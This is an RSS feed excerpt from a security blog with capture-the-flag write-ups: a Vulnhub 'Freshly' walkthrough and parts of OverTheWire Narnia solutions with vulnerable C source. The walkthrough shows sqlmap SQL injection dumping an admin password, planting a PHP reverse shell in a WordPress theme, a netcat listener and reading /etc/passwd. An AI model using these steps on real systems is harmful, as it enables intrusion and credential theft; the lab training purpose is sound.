    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;blah[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;bok[i]&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;blah[i];&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,bok);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
        
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;       
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;func(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;    
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s argument&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m struggling with this, and rather than delay the whole post because of the last
level, I decided to post anyway. I&amp;rsquo;ll update this when I have this figured out.&lt;/p&gt;

&lt;p&gt;Sorry.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Vulnhub&#39;s &#39;TopHatSec Freshly&#39;</title>
      <link>http://unlogic.co.uk/2015/04/11/vulnhubs-freshly/</link>
      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/04/11/vulnhubs-freshly/</guid>
      <description>&lt;p&gt;This is my first writeup of a &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&lt;/a&gt; wargame: Freshly.&lt;/p&gt;

&lt;p&gt;The challenge is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The goal of this challenge is to break into the machine via 
the web and find the secret hidden in a sensitive file. 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go grab the image and follow along.&lt;/p&gt;

&lt;p&gt;First I need to determine the image&amp;rsquo;s IP address and what services it is running:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sn 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
root@kali:~# nmap -p- 192.168.56.103

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I can see the host is at &lt;code&gt;192.168.56.103&lt;/code&gt; and has ports &lt;em&gt;80, 443, and 8080&lt;/em&gt;
open. Browsing to the address presents an animated gif.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qgkgkgg.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;My initial reaction is
to look at the source, but here I only see the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag and the image filename.
The image filename could be useful later, but right now I see no use for it.&lt;/p&gt;

&lt;p&gt;In that case let&amp;rsquo;s see if the SSL port holds anything more interesting.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/wvHo8ru.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Nice, looks like I&amp;rsquo;m getting somewhere. I follow this link to a wordpress site
which sells candy. Generally browsing the site I notice it&amp;rsquo;s a Bitnami install
of a Wordpress site, running a few plugins.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SHEXup3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Before I start work on that, let me just see what&amp;rsquo;s at port &lt;em&gt;8080&lt;/em&gt;. Ah, it&amp;rsquo;s a
non &lt;em&gt;https&lt;/em&gt; version of the wordpress site. I&amp;rsquo;m going to use that instead
of the &lt;em&gt;https&lt;/em&gt; version to avoid any certificate issues and generally make life
a bit easier.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;wpscan&lt;/code&gt; I can find out which of the installed plugins have vulnerabilities.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &amp;#39;_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress &amp;#39;http://192.168.56.103:8080/wordpress/readme.html&amp;#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &amp;#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&amp;#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 &amp;lt;============================================&amp;gt; (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s a few there, so I&amp;rsquo;ll look at each on in turn to see how easy it is to
exploit, and what it might yield.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection&lt;/p&gt;

&lt;p&gt;This requires the user to be logged in, and seeing as I don&amp;rsquo;t have a login
I won&amp;rsquo;t get very far with this.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) ###&lt;/p&gt;

&lt;p&gt;This requires admin access to the site, in order to configure the plugin.
Another dead end.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ProPlayer 4.7.9.1 - SQL Injection&lt;/p&gt;

&lt;p&gt;Not much luck with this. Although it doesn&amp;rsquo;t require a login, I wasn&amp;rsquo;t
successful with getting anything out of it.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect&lt;/p&gt;

&lt;p&gt;I doubt that an unvalidated redirect will be of much use here.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ok, thinking cap back on&amp;hellip;. I need a different angle of attack.&lt;/p&gt;

&lt;p&gt;Revisiting the main wordpress site there is something a bit unusual.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/2ddRfdF.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Did I miss something? Did I get done by a Jedi mindtrick? Let&amp;rsquo;s see. I&amp;rsquo;ll
head back to the main site and try and find some other pages with &lt;em&gt;DirBuster&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is how I set it up&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/auVPaoO.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Using this list I got lucky and received two interesting hits after short while&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/l647X5u.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve decided to hold back on on the &lt;code&gt;phpmyadmin&lt;/code&gt; and investigate the &lt;code&gt;login.php&lt;/code&gt;
first. This is what lies at the end of that URL&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/c8aSx4n.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I could just start attacking this with various SQLi strings, but the
beauty of attacking a virtual machine is that I can use tools without the fear
of breaking someone else&amp;rsquo;s stuff. Roll out &lt;code&gt;sqlmap&lt;/code&gt; and let&amp;rsquo;s see what we can find:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt;

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;user&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;password&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve removed some of the output for clarity, but I can see
that there&amp;rsquo;s possibility of a blind SQL injection for both &lt;code&gt;user&lt;/code&gt; and
&lt;code&gt;password&lt;/code&gt; and that it&amp;rsquo;s a MySQL databse. Great.
We can carry on using &lt;code&gt;sqlmap&lt;/code&gt; to try and discover
what tables there are and if we can find any useful information.&lt;/p&gt;

&lt;p&gt;First I&amp;rsquo;ll get a list of databases on the system. This process takes a little while,
so when it asks &amp;ldquo;&lt;em&gt;do you want sqlmap to try to optimize value(s) for DBMS delay
responses (option &amp;lsquo;&amp;ndash;time-sec&amp;rsquo;)? [Y/n]&lt;/em&gt;&amp;rdquo; answer &lt;em&gt;YES&lt;/em&gt;. It will be done quicker.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dbs

&amp;lt;snip&amp;gt;

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under &amp;#39;/root/.sqlmap/output/192.168.56.103&amp;#39;

[*] shutting down at 12:25:44
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It found seven databases, amongst which is an interesting one: &lt;code&gt;wordpress8080&lt;/code&gt;.
This seems to be the wordpress database, so I can start attacking that and see
if I can get the &lt;em&gt;admin&lt;/em&gt; account. The &lt;code&gt;login&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt; databases also look
interesting, so let&amp;rsquo;s take a look at those later. Additionally, if I can get
a login, especially an &lt;em&gt;admin&lt;/em&gt; one, I could try to exploit the plugins later on.
After all, it does say there are multiple ways into this VM.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --tables -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dump -T users -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The admin password for the wordpress site, excellent. As for the other tables,
I didn&amp;rsquo;t find anything useful in them, so I won&amp;rsquo;t post the output here. In that case
I might aswell just login to the wordpress site now. Basically I have full control
of the wordpress site now, so what should I do? How does a PHP shell sound? Good?
Alright then&amp;hellip; &lt;code&gt;cd /usr/share/webshells/php&lt;/code&gt; and I&amp;rsquo;m going to use the
&lt;code&gt;php-reverse-shell.php&lt;/code&gt; and replace the site&amp;rsquo;s &lt;em&gt;404&lt;/em&gt; with that.&lt;/p&gt;

&lt;p&gt;To do that I need to edit the theme in the admin section, and just
paste in the contents. The I need to open a listening &lt;code&gt;netcat&lt;/code&gt; session and
browse to a non-existant page on the site.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:/usr/share/webshells/php# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can&amp;#39;t access tty; job control turned off
$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /etc 
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# &lt;span style=&#34;color: #f8f8f2&#34;&gt;SECRET&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I had to poke around the file system a bit to find this, but &lt;code&gt;/etc/passwd&lt;/code&gt; is
usually a &lt;em&gt;go-to&lt;/em&gt; file if you get access to a system. Otherwise I&amp;rsquo;d still
be looking for the file now :)&lt;/p&gt;

&lt;p&gt;So that&amp;rsquo;s one way to do it.&lt;/p&gt;

&lt;p&gt;This seems to be the most direct route in. It might be worth exploring the
vulnerabilities on the plugins, but it&amp;rsquo;s late now, so I&amp;rsquo;ll save that for
another time.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Narnia Part 1</title>
      <link>http://unlogic.co.uk/2015/04/08/solving-narnia-part1/</link>
      <pubDate>Wed, 08 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/04/08/solving-narnia-part1/</guid>
      <description>

&lt;p&gt;Next up we take on &lt;a href=&#34;http://overthewire.org/wargames/narnia/&#34;&gt;Narnia&lt;/a&gt;. This is a
binary exploit centered wargame, so fire up your debuggers and let&amp;rsquo;s smash those
stacks. For levels 5, 6, 7, and 8, see &lt;a href=&#34;http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/&#34;&gt;part 2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;All levels are in &lt;code&gt;/narnia&lt;/code&gt; and both the binary and the source are provided.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve not included the passwords here, so you&amp;rsquo;ll have to work through
the exercises yourself (or find them elsewhere :))&lt;/p&gt;

&lt;h2 id=&#34;level-00:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 00&lt;/h2&gt;

&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;val&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0x41414141&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Here is your chance: &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;scanf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%24s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buf);&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;buf: %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,buf);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;val: 0x%08x&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,val);&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(val&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;WAY OFF!!!!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
